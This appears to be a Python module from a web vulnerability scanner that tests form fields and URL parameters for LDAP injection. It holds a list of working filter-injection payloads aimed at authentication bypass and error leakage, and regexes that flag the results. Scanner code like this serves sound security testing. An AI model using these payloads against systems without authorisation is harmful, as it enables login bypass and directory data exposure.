"""
LDAP Injection Scanner
Detects LDAP filter injection by submitting payloads that manipulate
DN/filter syntax, watching for authentication bypass or verbose error messages.
"""
import re
from typing import TYPE_CHECKING

from wscan.injection_point import InjectionPoint

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

_LDAP_PAYLOADS: list[str] = [
    # Authentication bypass / filter escape
    "*)(cn=*))(|(cn=*",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "admin)(|(password=*)",
    "*))(|(objectClass=*",
    # DN injection (path traversal through DIT)
    "admin,dc=example,dc=com",
    "cn=*",
    # Error-triggering syntax
    ")(invalid",
    "*))%00",
]

# Patterns indicating a successful injection or LDAP error leak
_ERROR_RE = re.compile(
    r"ldap(?:://|\s+error|exception)|javax\.naming|"
    r"invalid\s+dn|bad\s+search\s+filter|"
    r"no\s+such\s+object|size\s+limit\s+exceeded|"
    r"org\.springframework\.ldap|"
    r"com\.sun\.jndi\.ldap",
    re.IGNORECASE,
)
_BYPASS_RE = re.compile(
    r"(?:welcome|dashboard|logged in|authenticated|admin panel)",
    re.IGNORECASE,
)


class LDAPScanner(BaseScanner):
    """LDAP filter injection scanner."""

    CHECK_TYPE = "ldap"
    SEVERITY = "high"
    SUPPORTS_JSON_BODY = True

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        if is_url_param:
            return await self.browser.test_url_param(url, field_name, payload)
        await self.browser.navigate(url)
        return await self.browser.fill_and_submit_form(form_index, field_name, payload)

    def _classify(
        self,
        baseline_html: str,
        probe_html: str,
        payload: str,
    ) -> tuple[str, str, dict] | None:
        baseline_error = _ERROR_RE.search(baseline_html or "")
        probe_error = _ERROR_RE.search(probe_html or "")
        if probe_error and not baseline_error:
            marker = probe_error.group(0)[:150]
            return (
                "ldap_error",
                (
                    f"LDAP injection: LDAP error or class name leaked in response "
                    f"with payload {payload!r}"
                ),
                {"matched_error": marker},
            )

        baseline_success = _BYPASS_RE.search(baseline_html or "")
        probe_success = _BYPASS_RE.search(probe_html or "")
        if probe_success and not baseline_success:
            marker = probe_success.group(0)[:150]
            return (
                "ldap_auth_bypass",
                (
                    f"LDAP injection: authentication bypass — success page appeared "
                    f"only with payload {payload!r}"
                ),
                {"matched_success": marker},
            )

        return None

    async def scan_injection_point(
        self,
        ip: InjectionPoint,
        field: dict,
    ) -> list[Finding]:
        field_name = (
            field.get("name") or field.get("id") or f"field_{ip.form_index}"
        )
        findings: list[Finding] = []

        # Obtain a baseline response first
        # baseline もフィールド投入なので監査ログに残す（log_payload_test 一元化の不変条件）。
        await self.log_payload_test(
            field_name, "normaluser", "ldap_baseline", ip.url
        )
        try:
            baseline_html, _ = await self._apply_ip(ip, "normaluser")
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] ldap: baseline failed on {ip.url} ({field_name}): {exc}"
                )
            return []

        async def _test_payload(payload: str, check_label: str = self.CHECK_TYPE) -> bool:
            await self.log_payload_test(field_name, payload, check_label, ip.url)
            try:
                html, pair = await self._apply_ip(ip, payload)
            except Exception as exc:
                if self.monitor:
                    await self.monitor.emit_status(
                        f"[warn] ldap: request failed on {ip.url} ({field_name}): {exc}"
                    )
                return False

            classified = self._classify(baseline_html, html, payload)
            if classified:
                evidence_type, evidence, evidence_details = classified

                finding = await self.record_finding(
                    url=ip.url,
                    field_name=field_name,
                    payload=payload,
                    evidence=evidence,
                    pair=pair,
                    severity="high",
                    confidence="likely",
                    evidence_type=evidence_type,
                    evidence_details=evidence_details,
                    injection_point=ip,
                )
                findings.append(finding)
                return True
            return False

        for payload in _LDAP_PAYLOADS:
            if await _test_payload(payload):
                break  # one confirmed finding per field

        # evolution wave は legacy browser transport(is_url_param 前提)。json_body では
        # ip.legacy_is_url_param() が例外になり、かつ適用不能なので skip する（json は標準 payload のみ）。
        if not findings and ip.location != "json_body":
            extra_payloads = await self.evolved_payloads(
                ip.url,
                ip.form_index,
                ip.parameter_id,
                ip.legacy_is_url_param(),
            )
            for payload in extra_payloads:
                if await _test_payload(payload, "ldap_evolved"):
                    break

        return findings

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        """従来 API を InjectionPoint 駆動へ接続する互換 wrapper。"""
        name = field.get("name") or field.get("id") or f"field_{form_index}"
        ip = (
            InjectionPoint.for_url_param(url, name)
            if is_url_param
            else InjectionPoint.for_form(url, name, form_index)
        )
        return await self.scan_injection_point(ip, field)

    async def scan_page(self, url: str) -> list[Finding]:
        return []

    async def verify_finding(self, finding: Finding) -> bool | None:
        from urllib.parse import parse_qs, urlparse

        is_url_param = finding.field_name in parse_qs(
            urlparse(finding.url).query, keep_blank_values=True
        )
        ip = self._verify_injection_point(finding, is_url_param)
        try:
            # verify 時の再投入（baseline + payload）も監査ログに残す。
            await self.log_payload_test(
                finding.field_name, "normaluser", "ldap_verify_baseline", finding.url
            )
            baseline_html, _ = await self._apply_ip(ip, "normaluser")
            await self.log_payload_test(
                finding.field_name, finding.payload, "ldap_verify", finding.url
            )
            probe_html, _ = await self._apply_ip(ip, finding.payload)
        except Exception:
            return None

        classified = self._classify(baseline_html, probe_html, finding.payload)
        return bool(classified and classified[0] == finding.evidence_type)
